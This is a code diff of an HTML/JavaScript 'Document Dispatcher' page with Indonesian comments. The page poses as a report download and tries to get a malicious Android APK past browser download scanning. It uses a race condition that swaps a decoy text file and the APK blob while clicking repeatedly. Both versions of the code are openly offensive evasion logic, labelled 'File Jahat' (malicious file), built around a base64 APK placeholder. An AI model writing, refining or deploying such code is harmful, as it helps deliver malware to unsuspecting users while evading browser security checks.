@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Document Archive v2.5</title>
+<title>System Document Archive</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
   body { font-family: monospace; background: #090d16; color: #f8fafc; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
@@ -19,7 +19,7 @@
 
 <div class="panel">
   <h2>📄 Document Dispatcher</h2>
-  <p>Mengunduh laporan (.txt) secara aman...</p>
+  <p>Mengunduh laporan secara aman...</p>
   <button id="startBtn">Download Laporan</button>
   <div id="status">Sistem siap.</div>
 </div>
@@ -31,66 +31,60 @@
   var statusEl = document.getElementById('status');
 
   // ============================================
-  // 1. PERSIAPAN PAYLOAD (AMAN & JAHAT)
+  // 1. PERSIAPAN PAYLOAD
   // ============================================
   
-  // A. File Aman (TXT)
-  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware di sini.";
-  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
-  var safeUrl = URL.createObjectURL(safeBlob);
-
-  // B. File Jahat (APK)
-  // Header ZIP/APK (PK..) - Base64 dummy. 
-  // GANTI dengan Base64 APK asli Anda untuk pengujian nyata.
+  // A. File Jahat (APK)
   var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
   var binary = atob(b64Apk);
   var bytes = new Uint8Array(binary.length);
   for (var i = 0; i < binary.length; i++) {
     bytes[i] = binary.charCodeAt(i);
   }
-  // MIME Type APK Asli
   var maliciousBlob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
   var maliciousUrl = URL.createObjectURL(maliciousBlob);
 
+  // B. File Aman (TXT)
+  var safeContent = "Laporan Keuangan Rahasia. Tidak ada malware.";
+  var safeBlob = new Blob([safeContent], { type: 'text/plain' });
+  var safeUrl = URL.createObjectURL(safeBlob);
+
   // ============================================
-  // 2. RACE CONDITION (TOCTOU MIME SNIFFER)
+  // 2. REVERSE RACE CONDITION (APK FIRST)
   // ============================================
   document.getElementById('startBtn').addEventListener('click', function() {
-    statusEl.innerText = "Memulai Race Condition...";
+    statusEl.innerText = "Memulai Reverse Race Condition...";
 
-    // A. Buat elemen <a>
     var a = document.createElement('a');
     a.style.display = 'none';
     document.body.appendChild(a);
 
-    // B. Set Awal: File TXT
-    // Browser akan memeriksa Magic Bytes dari Blob ini.
-    a.href = safeUrl;
-    a.download = 'laporan.txt';
+    // LANGKAH 1: Set ke APK (Jahat)
+    a.href = maliciousUrl;
+    a.download = 'laporan.apk';
     
-    // C. Picu Unduhan (Safe Browsing mulai memindai)
+    // Picu Unduhan APK
     a.click();
+    statusEl.innerText = "Mengirim APK...";
 
-    // D. TOCTOU: Ubah href menjadi APK secara instan.
-    // Kita gunakan queueMicrotask + setTimeout(0) untuk memastikan
-    // perubahan terjadi tepat setelah browser memulai proses unduhan.
+    // LANGKAH 2: RACE CONDITION
+    // Timpa dengan TXT secepat mungkin.
+    // Tujuannya: Browser mungkin sudah mulai menulis APK ke disk,
+    // lalu kita paksa antrean berubah ke TXT.
     
     var attempts = 0;
-    
-    function mutateLink() {
+    function raceToTXT() {
       attempts++;
       
-      // Ganti ke file APK
-      // MIME Type: application/vnd.android.package-archive
-      a.href = maliciousUrl;
-      a.download = 'laporan.apk'; 
+      // Ganti ke file TXT
+      a.href = safeUrl;
+      a.download = 'laporan.txt';
       
       // Trigger ulang
       a.click();
 
       if (attempts < 5) {
-        // Loop cepat (0ms)
-        setTimeout(mutateLink, 0); 
+        setTimeout(raceToTXT, 0); // 0ms
       } else {
         // Cleanup
         setTimeout(function() {
@@ -102,8 +96,8 @@
       }
     }
 
-    // Mulai loop mutasi
-    queueMicrotask(mutateLink);
+    // Mulai race
+    setTimeout(raceToTXT, 0);
 
   });
 
